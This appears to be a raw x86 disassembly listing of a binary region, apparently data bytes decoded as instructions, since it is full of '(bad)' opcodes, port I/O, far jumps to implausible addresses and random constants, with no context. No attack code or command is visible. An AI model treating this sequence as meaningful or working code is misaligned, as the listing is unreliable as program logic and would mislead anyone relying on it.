  40c37a:	shr    BYTE PTR [edx+0xff6bf6b],0xc6
  40c381:	(bad)  
  40c382:	(bad)  
  40c383:	stos   DWORD PTR es:[edi],eax
  40c384:	sbb    al,0x22
  40c386:	push   ss
  40c387:	rol    DWORD PTR [esi-0x35],1
  40c38a:	inc    ebp
  40c38b:	push   es
  40c38c:	pop    eax
  40c38d:	ja     0x40c31d
  40c38f:	adc    al,0x35
  40c391:	xor    DWORD PTR [eax+0x48c98fae],ebp
  40c397:	ficom  WORD PTR [ecx]
  40c399:	adc    DWORD PTR [esi-0x1e],ecx
  40c39c:	xor    al,ah
  40c39e:	cmp    dh,bh
  40c3a0:	push   esp
  40c3a1:	and    BYTE PTR gs:[edi+0x714279ab],dl
  40c3a8:	adc    eax,0xc6357f07
  40c3ad:	xchg   ecx,eax
  40c3ae:	mul    DWORD PTR [edx-0x3e]
  40c3b1:	mov    dl,0x78
  40c3b3:	sbb    ch,BYTE PTR [ecx]
  40c3b5:	dec    ecx
  40c3b6:	and    ah,bh
  40c3b8:	jg     0x40c391
  40c3ba:	pusha  
  40c3bb:	stos   BYTE PTR es:[edi],al
  40c3bc:	(bad)  
  40c3be:	fadd   QWORD PTR [edi]
  40c3c0:	bound  esp,QWORD PTR [eax+ebp*1-0x54da8558]
  40c3c7:	jp     0x40c385
  40c3c9:	sbb    cl,dh
  40c3cb:	jg     0x40c3f9
  40c3cd:	inc    esi
  40c3ce:	inc    esp
  40c3cf:	ret    
  40c3d0:	xchg   ecx,eax
  40c3d1:	sahf   
  40c3d2:	cld    
  40c3d3:	sbb    bh,BYTE PTR [eax-0x3be32264]
  40c3d9:	inc    ebp
  40c3da:	sub    eax,0xe777e164
  40c3df:	mov    bl,BYTE PTR [ebp+0x43]
  40c3e2:	and    edi,0xde070d59
  40c3e8:	sub    edx,edx
  40c3ea:	retf   0xbf6
  40c3ed:	(bad)  
  40c3ee:	cli    
  40c3ef:	(bad)  
  40c3f0:	ins    BYTE PTR es:[edi],dx
  40c3f1:	xchg   ecx,eax
  40c3f2:	(bad)  
  40c3f3:	retf   0x219
  40c3f6:	fnstcw WORD PTR [ebp+0x4b9a99ee]
  40c3fc:	mov    bl,BYTE PTR [ebx+0x57c3008e]
  40c402:	jmp    0xeaa9fd48
  40c407:	mov    dl,BYTE PTR [esi-0x294cc38e]
  40c40d:	cmc    
  40c40e:	jl     0x40c442
  40c410:	addr16 clc 
  40c412:	pop    ss
  40c413:	aas    
  40c414:	in     al,0x61
  40c416:	outs   dx,BYTE PTR ds:[esi]
  40c417:	and    ecx,DWORD PTR [esi-0x3c087ee6]
  40c41d:	nop
  40c41e:	pop    ds
  40c41f:	adc    ebx,DWORD PTR [ebp-0x7c]
  40c422:	cmp    DWORD PTR [esi+0x7],0xffffffe6
  40c426:	pop    ss
  40c427:	sub    dh,0xa8
  40c42a:	adc    esi,ecx
  40c42c:	jmp    0x40c3e4
  40c42e:	repnz mov cl,0x50
  40c431:	xlat   BYTE PTR ds:[ebx]
  40c432:	and    ebp,DWORD PTR [eax]
  40c434:	ins    DWORD PTR es:[edi],dx
  40c435:	push   ebp
  40c436:	sub    DWORD PTR [ebx+0x4c84ce0],esi
  40c43c:	or     BYTE PTR es:[ebx-0x5d3cf251],al
  40c443:	sub    cl,BYTE PTR [ebp+0x4f8d22cb]
  40c449:	cs jle 0x40c456
  40c44c:	and    al,0xee
  40c44e:	inc    esp
  40c44f:	xchg   edx,eax
  40c450:	xchg   ebx,eax
  40c451:	pand   mm5,QWORD PTR [ecx]
  40c454:	cdq    
  40c455:	arpl   WORD PTR [eax-0x40301e20],sp
  40c45b:	or     DWORD PTR [eax],ebp
  40c45d:	test   ebp,edx
  40c45f:	inc    bh
  40c461:	rcr    DWORD PTR [edx-0x4],0xce
  40c465:	mov    ecx,0x7443ccb2
  40c46a:	lahf   
  40c46b:	pop    es
  40c46c:	xchg   di,ax
  40c46e:	lods   al,BYTE PTR ds:[esi]
  40c46f:	mov    edx,0x2df4130e
  40c474:	dec    ecx
  40c475:	cmc    
  40c476:	mul    DWORD PTR ds:0x1db550d3
  40c47c:	(bad)  
  40c47d:	rcl    BYTE PTR [ecx],1
  40c47f:	test   al,0xf6
  40c481:	jge    0x40c49b
  40c483:	les    ecx,FWORD PTR [edx+0x719f5b4a]
  40c489:	adc    eax,0x1
  40c48c:	ficom  WORD PTR [edx-0x4c2be893]
  40c492:	adc    eax,0xe2af62a9
  40c497:	arpl   WORD PTR [edi],dx
  40c499:	outs   dx,BYTE PTR ds:[esi]
  40c49a:	(bad)  
  40c49b:	push   ecx
  40c49c:	push   ds
  40c49d:	daa    
  40c49e:	test   al,0xcd
  40c4a0:	jno    0x40c447
  40c4a2:	inc    edx
  40c4a3:	fcmovnbe st,st(7)
  40c4a5:	sub    DWORD PTR [esp+edx*2],0xfffffff0
  40c4a9:	(bad)  
  40c4aa:	cwde   
  40c4ab:	cli    
  40c4ac:	push   eax
  40c4ad:	pop    edx
  40c4ae:	test   al,0xa5
  40c4b0:	pop    es
  40c4b1:	pushf  
  40c4b2:	jae    0x40c52c
  40c4b4:	mov    ah,0xd5
  40c4b6:	xchg   ebx,eax
  40c4b7:	mov    ebp,0x752256a7
  40c4bc:	sub    al,0x6e
  40c4be:	push   es
  40c4bf:	mov    WORD PTR [ecx-0x73],?
  40c4c2:	or     ch,BYTE PTR [esi-0x24]
  40c4c5:	mov    dh,0xab
  40c4c7:	dec    ebp
  40c4c8:	xchg   esp,eax
  40c4c9:	push   ss
  40c4ca:	jg     0x40c466
  40c4cc:	push   ds
  40c4cd:	mov    cl,0xeb
  40c4cf:	lods   eax,DWORD PTR ds:[esi]
  40c4d0:	out    0x36,al
  40c4d2:	or     dl,bh
  40c4d4:	ficom  WORD PTR [ebx+0x79]
  40c4d7:	mov    bl,0x1c
  40c4d9:	es jo  0x40c464
  40c4dc:	or     dl,BYTE PTR [ecx-0x50]
  40c4df:	loopne 0x40c515
  40c4e1:	pop    ds
  40c4e2:	inc    ebp
  40c4e3:	mov    cl,0x83
  40c4e5:	and    dh,BYTE PTR [edi+0x49]
  40c4e8:	je     0x40c4b0
  40c4ea:	xchg   esp,eax
  40c4eb:	or     al,0x31
  40c4ed:	loopne 0x40c4c4
  40c4ef:	and    ax,0xe94a
  40c4f3:	out    0x9d,al
  40c4f5:	push   eax
  40c4f6:	mov    al,BYTE PTR [esi+0x78511486]
  40c4fc:	daa    
  40c4fd:	aaa    
  40c4fe:	adc    eax,0x6f3fd50e
  40c503:	push   edx
  40c504:	popf   
  40c505:	add    esp,DWORD PTR [esp+edx*2+0x77]
  40c509:	aad    0x5
  40c50b:	mov    esp,0x23e891ce
  40c510:	std    
  40c511:	xchg   BYTE PTR [ecx],al
  40c513:	or     esp,DWORD PTR [edx]
  40c515:	mov    bh,0xe6
  40c517:	push   eax
  40c518:	inc    esp
  40c519:	scas   eax,DWORD PTR es:[edi]
  40c51a:	bound  edi,QWORD PTR [edx]
  40c51c:	pop    ebx
  40c51d:	stos   DWORD PTR es:[edi],eax
  40c51e:	into   
  40c51f:	stos   BYTE PTR es:[edi],al
  40c520:	mov    ds,WORD PTR [eax-0xb7a8b51]
  40c526:	mov    cl,0xcf
  40c528:	cmp    eax,0xf23e5584
  40c52d:	cmp    DWORD PTR [edx+0x4f],ecx
  40c530:	enter  0x4f31,0xc2
  40c534:	mov    ecx,0x823641e
  40c539:	test   eax,0x49c6fc99
  40c53e:	jg     0x40c4e5
  40c540:	test   bh,bl
  40c542:	or     esp,DWORD PTR [eax]
  40c544:	sub    eax,0x797695ab
  40c549:	out    dx,eax
  40c54a:	cld    
  40c54b:	adc    BYTE PTR [edi-0x38],al
  40c54e:	mov    esp,eax
  40c550:	xor    DWORD PTR [esi-0x60],0xffffffab
  40c554:	push   esp
  40c555:	push   eax
  40c556:	jb     0x40c591
  40c558:	pop    ebp
  40c559:	mov    dl,0x55
  40c55b:	mov    ecx,0xf4da6bdc
  40c560:	(bad)  
  40c561:	sbb    DWORD PTR [edx+0x4479c5b4],0xb4c43cf8
  40c56b:	outs   dx,DWORD PTR ds:[esi]
  40c56c:	fld    TBYTE PTR [esi]
  40c56e:	loope  0x40c581
  40c570:	lods   eax,DWORD PTR ds:[esi]
  40c571:	imul   ecx,DWORD PTR [edi],0x67efd214
  40c577:	push   edi
  40c578:	push   ecx
  40c579:	sub    al,BYTE PTR [esi+0x1c9d8ddb]
  40c57f:	out    dx,al
  40c580:	ja     0x40c522
  40c582:	and    dl,BYTE PTR [ebp+0x2b3250a5]
  40c588:	jge    0x40c5ea
  40c58a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c58b:	lock mov dl,0x91
  40c58e:	or     eax,0x96202
  40c593:	cmp    BYTE PTR [esi-0x3b7888b],dh
  40c599:	aaa    
  40c59a:	std    
  40c59b:	mov    ds:0xd067be39,eax
  40c5a0:	cmp    al,0xd2
  40c5a2:	sti    
  40c5a3:	jns    0x40c571
  40c5a5:	ss or  eax,0xa0e08ab
  40c5ab:	cmc    
  40c5ac:	jle    0x40c615
  40c5ae:	mov    al,0xc
  40c5b0:	ret    0xb097
  40c5b3:	repz (bad) 
  40c5b5:	popa   
  40c5b6:	aaa    
  40c5b7:	jl     0x40c62f
  40c5b9:	mov    esp,0xa9748900
  40c5be:	inc    DWORD PTR [edx+0x34a05e94]
  40c5c4:	sbb    al,cl
  40c5c6:	sbb    al,0xba
  40c5c8:	fld1   
  40c5ca:	sbb    al,0xbf
  40c5cc:	push   ds
  40c5cd:	sbb    eax,0x90213640
  40c5d2:	out    0x5d,al
  40c5d4:	repz jbe 0x40c650
  40c5d7:	pop    ebp
  40c5d8:	ins    BYTE PTR es:[edi],dx
  40c5d9:	fisub  DWORD PTR [esi+0x7e]
  40c5dc:	push   ecx
  40c5dd:	or     DWORD PTR [esi+0x38],edx
  40c5e0:	or     bl,ah
  40c5e2:	ret    0xcd2b
  40c5e5:	xor    BYTE PTR [ebx+0x60cddc1c],cl
  40c5eb:	retf   
  40c5ec:	mov    ebp,0x8bbfd37
  40c5f1:	pop    es
  40c5f2:	cmp    eax,0x65e8aff4
  40c5f7:	mov    bh,0xa4
  40c5f9:	ret    
  40c5fa:	sbb    al,0xfd
  40c5fc:	cmp    BYTE PTR [esi],0xc8
  40c5ff:	pop    es
  40c600:	xchg   esp,eax
  40c601:	repnz fs sub al,0xc2
  40c605:	or     bh,bl
  40c607:	and    al,0xd
  40c609:	jmp    FWORD PTR [edi+eax*4+0x9]
  40c60d:	jl     0x40c63e
  40c60f:	xlat   BYTE PTR ds:[ebx]
  40c610:	sbb    al,0x85
  40c612:	push   ds
  40c613:	rcr    DWORD PTR [edi+eiz*8+0x3d2ff0e2],0xbb
  40c61b:	push   eax
  40c61c:	xchg   DWORD PTR [edx],edi
  40c61e:	mov    eax,0xa3acd4e1
  40c623:	rcl    BYTE PTR [ecx],1
  40c625:	jb     0x40c68e
  40c627:	cwde   
  40c628:	add    BYTE PTR [edi+0x3e519936],bl
  40c62e:	mov    al,BYTE PTR [ebp+0x3dcfa62b]
  40c634:	aam    0x65
  40c636:	mov    cl,0xdd
  40c638:	pop    esi
  40c639:	xor    ecx,DWORD PTR ds:[eax+0x2904d236]
  40c640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c641:	xchg   edi,eax
  40c642:	lods   eax,DWORD PTR cs:[esi]
  40c644:	pop    ecx
  40c645:	outs   dx,BYTE PTR ds:[esi]
  40c646:	ss sub eax,esi
  40c649:	lods   eax,DWORD PTR ds:[esi]
  40c64a:	dec    edi
  40c64b:	shl    BYTE PTR [edi],1
  40c64d:	sub    eax,0xae1b598f
  40c652:	jle    0x40c5df
  40c654:	cdq    
  40c655:	jg     0x40c62d
  40c657:	adc    BYTE PTR [edi-0x64f13f0d],dh
  40c65d:	mov    dl,0xdc
  40c65f:	add    DWORD PTR [esi-0x184c2aab],esp
  40c665:	cmp    eax,0x649f1c0f
  40c66a:	xor    dh,BYTE PTR [eax]
  40c66c:	inc    edi
  40c66d:	add    DWORD PTR [edi+0x75],eax
  40c670:	push   es
  40c671:	cwde   
  40c672:	in     al,dx
  40c673:	inc    ebp
  40c674:	in     al,0xc9
  40c676:	dec    edi
  40c677:	cmp    DWORD PTR [edi+0x19],ebx
  40c67a:	jecxz  0x40c613
  40c67c:	fadd   st,st(5)
  40c67e:	cmp    edx,esi
  40c680:	(bad)  
  40c681:	imul   esi,DWORD PTR [ebp-0xc],0x78345e75
  40c688:	jge    0x40c636
  40c68a:	shl    BYTE PTR gs:[esi-0x11],cl
  40c68e:	mov    bl,0x8
  40c690:	mov    edx,0xe2f6943f
  40c695:	ret    0x6fd1
  40c698:	ins    BYTE PTR es:[edi],dx
  40c699:	adc    dl,BYTE PTR [eax-0x22]
  40c69c:	inc    edi
  40c69d:	jns    0x40c678
  40c69f:	jecxz  0x40c635
  40c6a1:	xchg   ecx,eax
  40c6a2:	cmp    eax,0x3f46b6c3
  40c6a7:	sub    eax,0xd38bcc3f
  40c6ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6ad:	(bad)  
  40c6ae:	xor    BYTE PTR [esi+edi*2],bh
  40c6b1:	pop    esp
  40c6b2:	xor    eax,0x4be0a633
  40c6b7:	scas   al,BYTE PTR es:[edi]
  40c6b8:	ja     0x40c694
  40c6ba:	sub    al,bh
  40c6bc:	mov    BYTE PTR [ecx],bl
  40c6be:	jo     0x40c68b
  40c6c0:	jmp    0x40c67e
  40c6c2:	pop    ebx
  40c6c3:	test   DWORD PTR [ebp+0x1f],0xa885de82
  40c6ca:	retf   
  40c6cb:	(bad)  
  40c6cc:	in     al,0x1a
  40c6ce:	mov    ds:0x5b463c78,al
  40c6d4:	and    BYTE PTR [eax-0x5d],cl
  40c6d7:	xchg   ebx,eax
  40c6d8:	adc    ecx,DWORD PTR [edx-0x21]
  40c6db:	das    
  40c6dc:	dec    ebx
  40c6dd:	add    DWORD PTR [eax-0x424af08e],eax
  40c6e3:	push   edi
  40c6e4:	xchg   edi,eax
  40c6e5:	cs ds or ebx,esp
  40c6e9:	in     eax,0x38
  40c6eb:	add    BYTE PTR [edx],ah
  40c6ed:	mov    ebx,0xab0720bd
  40c6f2:	adc    eax,0x3333071b
  40c6f7:	push   ds
  40c6f8:	xlat   BYTE PTR ds:[ebx]
  40c6f9:	and    edx,DWORD PTR [ebp+eax*4+0x5e46d2aa]
  40c700:	std    
  40c701:	mov    cl,0xf4
  40c703:	jns    0x40c6e0
  40c705:	shl    DWORD PTR [edi-0x2f45db1d],1
  40c70b:	sar    BYTE PTR [ecx-0x1b],1
  40c70e:	push   edx
  40c70f:	push   cs
  40c710:	not    BYTE PTR [edx+0x442e4360]
  40c716:	cmp    al,BYTE PTR [ecx-0xc]
  40c719:	in     al,dx
  40c71a:	mov    ah,0x47
  40c71c:	js     0x40c6a9
  40c71e:	mov    ebp,0x97c5d606
  40c723:	push   0x828f3e1a
  40c728:	je     0x40c714
  40c72a:	call   0x18702207
  40c72f:	add    eax,0x24c22336
  40c734:	push   es
  40c735:	es push ebp
  40c737:	mov    ds:0xa71f7d32,al
  40c73c:	cmp    eax,0xb969925a
  40c741:	mov    eax,ds:0x6fa57dea
  40c746:	lea    ebx,[ecx-0x1e]
  40c749:	fs pop ss
  40c74b:	shl    BYTE PTR [ecx],cl
  40c74d:	es jmp 0x4f24:0xbcd6de21
  40c755:	(bad)  
  40c756:	icebp  
  40c757:	jne    0x40c726
  40c759:	add    esi,DWORD PTR [ecx-0x66]
  40c75c:	and    edi,ecx
  40c75e:	shl    DWORD PTR [ebx],1
  40c760:	mov    ebp,0xa6502412
  40c765:	lods   al,BYTE PTR ds:[esi]
  40c766:	stc    
  40c767:	and    BYTE PTR [ecx],ch
  40c769:	imul   eax,DWORD PTR [ebp-0x505de0d2],0x89217349
  40c773:	mov    ds:0x1f1566fe,eax
  40c778:	xchg   esp,eax
  40c779:	call   0x867f:0x385d5105
  40c780:	pop    ecx
  40c781:	or     ecx,DWORD PTR [esi+0x2b]
  40c784:	or     al,BYTE PTR [ecx]
  40c786:	cmp    al,0x6d
  40c788:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c78a:	adc    al,0x85
  40c78c:	fcomp  DWORD PTR [edi+edi*4]
  40c78f:	and    DWORD PTR [ebp+0x70],edi
  40c792:	jae    0x40c78c
  40c794:	jb     0x40c770
  40c796:	cwde   
  40c797:	shl    BYTE PTR [esi],cl
  40c799:	mov    esp,0x600b1193
  40c79e:	outs   dx,DWORD PTR ds:[esi]
  40c79f:	cmp    al,0x75
  40c7a1:	push   esi
  40c7a2:	adc    al,0x27
  40c7a4:	leave  
  40c7a5:	repz add al,0x53
  40c7a8:	stos   BYTE PTR es:[edi],al
  40c7a9:	mov    esi,DWORD PTR [edi+0xd89b4ce]
  40c7af:	dec    ebp
  40c7b0:	jae    0x40c7b1
  40c7b2:	cdq    
  40c7b3:	fsubr  QWORD PTR [eax+edx*2]
  40c7b6:	fwait
  40c7b7:	adc    bl,0xa0
  40c7ba:	adc    ah,BYTE PTR [eax-0x64aa5d13]
  40c7c0:	ficom  WORD PTR [edi-0x6e429014]
  40c7c6:	int    0x44
  40c7c8:	add    ebp,DWORD PTR [ebx-0x52744b0b]
  40c7ce:	in     eax,dx
  40c7cf:	fdiv   QWORD PTR [ebx-0x4]
  40c7d2:	xor    ch,ch
  40c7d4:	bound  edi,QWORD PTR [ecx]
  40c7d6:	xchg   BYTE PTR [edx+0x59],cl
  40c7d9:	scas   al,BYTE PTR es:[edi]
  40c7da:	pushf  
  40c7db:	cld    
  40c7dc:	adc    eax,0xe3217032
  40c7e1:	add    DWORD PTR [esi+0x2516c804],esi
  40c7e7:	lock (bad) 
  40c7e9:	xchg   edi,eax
  40c7ea:	push   edi
  40c7eb:	push   ecx
  40c7ec:	nop
  40c7ed:	loop   0x40c7f7
  40c7ef:	xor    DWORD PTR [edx-0x1d6e01b7],edi
  40c7f5:	sub    BYTE PTR [edx],0x29
  40c7f8:	mov    eax,0xf016186e
  40c7fd:	test   esp,edx
  40c7ff:	mov    edx,0x2d917fe6
  40c804:	(bad)  
  40c806:	dec    esp
  40c807:	jb     0x40c82a
  40c809:	(bad)  
  40c80a:	cmp    eax,esi
  40c80c:	leave  
  40c80d:	xchg   DWORD PTR [ecx],ecx
  40c80f:	ins    DWORD PTR es:[edi],dx
  40c810:	mov    bh,0x59
  40c812:	pop    ecx
  40c813:	sbb    BYTE PTR [edx-0x7409f165],0xb9
  40c81a:	push   edx
  40c81b:	pusha  
  40c81c:	fldcw  WORD PTR [ebx]
  40c81e:	pop    ebx
  40c81f:	ficom  WORD PTR [ecx]
  40c821:	add    DWORD PTR [esi],0x1a
  40c824:	xchg   esp,eax
  40c825:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40c827:	mov    bh,0xb0
  40c829:	scas   al,BYTE PTR es:[edi]
  40c82a:	push   edx
  40c82b:	loope  0x40c7fa
  40c82d:	data16 or BYTE PTR [edx+0x6],ah
  40c831:	into   
  40c832:	pop    esi
  40c833:	sub    cl,ah
  40c835:	aaa    
  40c836:	cld    
  40c837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c838:	ins    DWORD PTR es:[edi],dx
  40c839:	dec    ebp
  40c83a:	mov    ecx,0x35383386
  40c83f:	mov    ebx,0x3297f3c5
  40c844:	and    al,0x61
  40c846:	push   ebp
  40c847:	xor    ebp,ecx
  40c849:	fmul   st(0),st
  40c84b:	leave  
  40c84c:	(bad)  
  40c84d:	es into 
  40c84f:	cmp    al,0x1
  40c851:	loopne 0x40c848
  40c853:	pop    edx
  40c854:	mov    ebp,0x5c476c25
  40c859:	mov    eax,ds:0x69d386be
  40c85e:	ins    DWORD PTR es:[edi],dx
  40c85f:	or     eax,DWORD PTR [esi+0xe]
  40c862:	je     0x40c821
  40c864:	shl    BYTE PTR [edi-0x12],cl
  40c867:	xor    bh,BYTE PTR [ecx-0x963a8cd]
  40c86d:	pop    ebx
  40c86e:	cli    
  40c86f:	adc    esp,DWORD PTR [edi-0x17dff182]
  40c875:	adc    DWORD PTR [ebx],0xffffffd8
  40c878:	fsubr  QWORD PTR [ecx-0x19]
  40c87b:	jmp    0x42d4:0x6b2d1e69
  40c882:	and    DWORD PTR [edi+0x1a25638f],esp
  40c888:	inc    esp
  40c889:	inc    ecx
  40c88a:	ss inc edi
  40c88c:	dec    ecx
  40c88d:	pushf  
  40c88e:	sbb    BYTE PTR [edi+edx*4-0x7c],ch
  40c892:	xchg   dx,ax
  40c894:	push   gs
  40c896:	xor    al,0x4f
  40c898:	mov    DWORD PTR [edi-0x283b1979],eax
  40c89e:	and    BYTE PTR [edi+0x14],ch
  40c8a1:	mov    eax,ds:0x931c5980
  40c8a6:	(bad)  
  40c8a7:	(bad)  
  40c8a8:	rcl    dl,0x91
  40c8ab:	retf   
  40c8ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8ad:	dec    esi
  40c8ae:	or     cl,BYTE PTR [ecx-0x1c]
  40c8b1:	and    eax,DWORD PTR ds:0x5bdc5705
  40c8b7:	stos   DWORD PTR es:[edi],eax
  40c8b8:	mov    WORD PTR [ebp-0x498a064d],?
  40c8be:	cmp    DWORD PTR ds:0xdabb298,esi
  40c8c4:	(bad)  
  40c8c6:	clc    
  40c8c7:	retf   0xdf6b
  40c8ca:	sbb    eax,0xaec3d8b8
  40c8cf:	mov    ?,WORD PTR [ebp+0x28bb4b09]
  40c8d5:	dec    esp
  40c8d6:	repz xor ebp,0xfbaae44e
  40c8dd:	leave  
  40c8de:	xor    ecx,DWORD PTR [edi+0x4f2eda81]
  40c8e4:	sub    DWORD PTR [esi],0x9ccbc3db
  40c8ea:	fdivr  QWORD PTR [edi]
  40c8ec:	xchg   ecx,eax
  40c8ed:	loope  0x40c96c
  40c8ef:	dec    ecx
  40c8f0:	sahf   
  40c8f1:	and    DWORD PTR [edx-0x3f7cca0],esi
  40c8f7:	ins    BYTE PTR es:[edi],dx
  40c8f8:	push   es
  40c8f9:	sub    DWORD PTR [ebp+0xf433e92],ecx
  40c8ff:	shl    eax,cl
  40c901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c902:	push   0xc6c8500c
  40c907:	(bad)  
  40c909:	call   0x61d0:0x663ef594
  40c910:	push   ecx
  40c911:	les    ebx,FWORD PTR [edx+0x1a]
  40c914:	fistp  QWORD PTR [eax]
  40c916:	in     eax,dx
  40c917:	mov    ds:0x62d9e3cd,eax
  40c91c:	js     0x40c8e9
  40c91e:	imul   eax,ebx,0xfb31dbab
  40c924:	int3   
  40c925:	mov    ebx,0xc7d0cabb
  40c92a:	inc    edi
  40c92b:	repnz test ebp,esi
  40c92e:	dec    ecx
  40c92f:	inc    ebp
  40c930:	add    ecx,eax
  40c932:	mov    bh,0x90
  40c934:	xchg   esi,eax
  40c935:	pop    ss
  40c936:	adc    ebx,esi
  40c938:	inc    esi
  40c939:	bound  edi,QWORD PTR [ebx+0x50]
  40c93c:	mov    ah,BYTE PTR [edi+esi*4]
  40c93f:	dec    edi
  40c940:	fucom  st(2)
  40c942:	call   0xb5d6740
  40c947:	out    0xe0,al
  40c949:	pop    ebp
  40c94a:	jno    0x40c953
  40c94c:	mov    cl,0x5f
  40c94e:	pop    ds
  40c94f:	hlt    
  40c950:	jmp    0x2e86:0x11929157
  40c957:	push   0xfffffff5
  40c959:	xor    DWORD PTR [ebp-0x6],esp
  40c95c:	ffreep st(7)
  40c95e:	rol    DWORD PTR [edi+0x3ab611d],1
  40c964:	sub    BYTE PTR [ebx-0x58],al
  40c967:	or     al,0xee
  40c969:	cs cmp bl,al
  40c96c:	xchg   ebx,eax
  40c96d:	dec    esp
  40c96e:	sub    edx,DWORD PTR [ebx-0x6d1f4a57]
  40c974:	bound  edx,QWORD PTR [edx-0x18]
  40c977:	fild   QWORD PTR [ebx+0x4d]
  40c97a:	aas    
  40c97b:	ds sahf 
  40c97d:	loopne 0x40c968
  40c97f:	(bad)  
  40c980:	jmp    0x74716670
  40c985:	sub    bl,0xc4
  40c988:	xor    esi,DWORD PTR [esi+0x20]
  40c98b:	stc    
  40c98c:	add    DWORD PTR cs:0x68741274,edi
  40c993:	or     bh,0x5b
  40c996:	jg     0x40c9a6
  40c998:	cli    
  40c999:	and    eax,0x4e080363
  40c99e:	or     DWORD PTR [ebx+0x5b],esi
  40c9a1:	lds    esp,FWORD PTR [eax]
  40c9a3:	dec    esp
  40c9a4:	sbb    BYTE PTR [edx+0x25ac823a],cl
  40c9aa:	mov    ds:0xf3edaf65,al
  40c9af:	xchg   edx,eax
  40c9b0:	or     eax,0x95ef40f9
  40c9b5:	dec    esp
  40c9b6:	(bad)  
  40c9b7:	scas   al,BYTE PTR es:[edi]
  40c9b8:	mov    dl,BYTE PTR [edx-0x78]
  40c9bb:	adc    dl,cl
  40c9bd:	ret    0xd7a8
  40c9c0:	jnp    0x40c964
  40c9c2:	popf   
  40c9c3:	clc    
  40c9c4:	or     bl,dh
  40c9c6:	adc    DWORD PTR [ebp+0x1f4228b8],ebx
  40c9cc:	mov    ecx,0xb3b1444b
  40c9d1:	(bad)  
  40c9d3:	jnp    0x40ca4f
  40c9d5:	test   al,0xbc
  40c9d7:	(bad)  
  40c9d8:	pop    ebp
  40c9d9:	pop    edi
  40c9da:	xlat   BYTE PTR ds:[ebx]
  40c9db:	xchg   ecx,eax
  40c9dc:	fbld   TBYTE PTR [ebp+0x4295ba9b]
  40c9e2:	mov    ah,0x4f
  40c9e4:	or     di,WORD PTR [edi+0x36]
  40c9e8:	mov    ch,0x77
  40c9ea:	sbb    eax,0x67059826
  40c9ef:	jg     0x40c9c3
  40c9f1:	cmc    
  40c9f2:	ins    DWORD PTR es:[edi],dx
  40c9f3:	ins    BYTE PTR es:[edi],dx
  40c9f4:	and    eax,DWORD PTR [esi+0x9d03d4a]
  40c9fa:	pop    ss
  40c9fb:	inc    ebx
  40c9fc:	adc    edi,ecx
  40c9fe:	icebp  
  40c9ff:	ins    DWORD PTR es:[edi],dx
  40ca00:	lock imul eax,DWORD PTR [eax],0xffffffe2
  40ca04:	(bad)  
  40ca05:	or     eax,DWORD PTR [ecx+0x65f84460]
  40ca0b:	mov    DWORD PTR [eax-0x10],ebx
  40ca0e:	mov    dl,0x89
  40ca10:	outs   dx,DWORD PTR ds:[esi]
  40ca11:	sbb    dh,0xe1
  40ca14:	sbb    al,0xd7
  40ca16:	cmp    al,0xf5
  40ca18:	or     DWORD PTR [esi+0xe],esp
  40ca1b:	les    edi,FWORD PTR [esi]
  40ca1d:	add    eax,0xbd3fd30f
  40ca22:	jg     0x40ca47
  40ca24:	mov    ebx,0xe312c065
  40ca29:	pop    ds
  40ca2a:	cmp    bl,ch
  40ca2c:	inc    esp
  40ca2d:	repz mov bh,0x7c
  40ca30:	arpl   WORD PTR [edi-0x43477548],si
  40ca36:	xchg   BYTE PTR ds:0xeb676507,ah
  40ca3c:	mov    ch,0xe5
  40ca3e:	fsubr  st,st(7)
  40ca40:	mov    cs:0xbe59e523,al
  40ca46:	into   
  40ca47:	(bad)  
  40ca48:	inc    ebx
  40ca49:	scas   eax,DWORD PTR es:[edi]
  40ca4a:	ds setg ah
  40ca4e:	imul   ecx,DWORD PTR [ebx+0xca88660],0x25
  40ca55:	scas   al,BYTE PTR es:[edi]
  40ca56:	fisubr WORD PTR [esi+esi*4-0x45]
  40ca5a:	cmp    bl,dh
  40ca5c:	sub    ebp,DWORD PTR [eax+0x3a]
  40ca5f:	jns    0x40ca40
  40ca61:	xchg   esp,eax
  40ca62:	das    
  40ca63:	jne    0x40ca72
  40ca65:	sub    bh,BYTE PTR [ebx+0x29569449]
  40ca6b:	cli    
  40ca6c:	ins    BYTE PTR es:[edi],dx
  40ca6d:	bound  ecx,QWORD PTR [ecx-0xd]
  40ca70:	mov    ds:0xe4f1a504,eax
  40ca75:	inc    esi
  40ca76:	pop    esp
  40ca77:	ficom  DWORD PTR [ecx+edx*2+0x6a3cc6fa]
  40ca7e:	pop    esp
  40ca7f:	(bad)  
  40ca80:	or     eax,0x71334541
  40ca85:	dec    edx
  40ca86:	inc    ebx
  40ca87:	or     dh,bh
  40ca89:	ror    al,1
  40ca8b:	je     0x40ca55
  40ca8d:	jae    0x40caf8
  40ca8f:	mov    ebp,0x3f5fbf42
  40ca94:	push   es
  40ca95:	dec    esi
  40ca96:	ins    DWORD PTR es:[edi],dx
  40ca97:	push   ss
  40ca98:	(bad)  
  40ca99:	mov    ah,0x2b
  40ca9b:	call   0xfe2d2738
  40caa0:	xchg   cl,cl
  40caa2:	mov    bh,0x29
  40caa4:	push   esi
  40caa5:	or     DWORD PTR [ebx],ebx
  40caa7:	cmp    BYTE PTR [esi-0x2a15e057],dl
  40caad:	push   cs
  40caae:	add    bh,BYTE PTR [eax+ecx*4-0x6d263479]
  40cab5:	xor    BYTE PTR [ebp+0x16],bl
  40cab8:	cmp    dl,BYTE PTR [ecx-0x1b8482aa]
  40cabe:	push   0xd9d75fde
  40cac3:	enter  0x4d3a,0xaf
  40cac7:	push   edi
  40cac8:	stos   DWORD PTR es:[edi],eax
  40cac9:	mov    edx,0x7c408d94
  40cace:	bound  edx,QWORD PTR [eax+ebp*8]
  40cad1:	mov    dl,0x1d
  40cad3:	(bad)  
  40cad4:	mov    bl,0xe0
  40cad6:	push   es
  40cad7:	pusha  
  40cad8:	or     eax,0xa1f249b0
  40cadd:	and    eax,0xb3348b09
  40cae2:	and    esi,DWORD PTR [edx-0x48]
  40cae5:	data16 in al,dx
  40cae7:	inc    eax
  40cae8:	xchg   esi,eax
  40cae9:	mov    bh,0x2e
  40caeb:	pop    edx
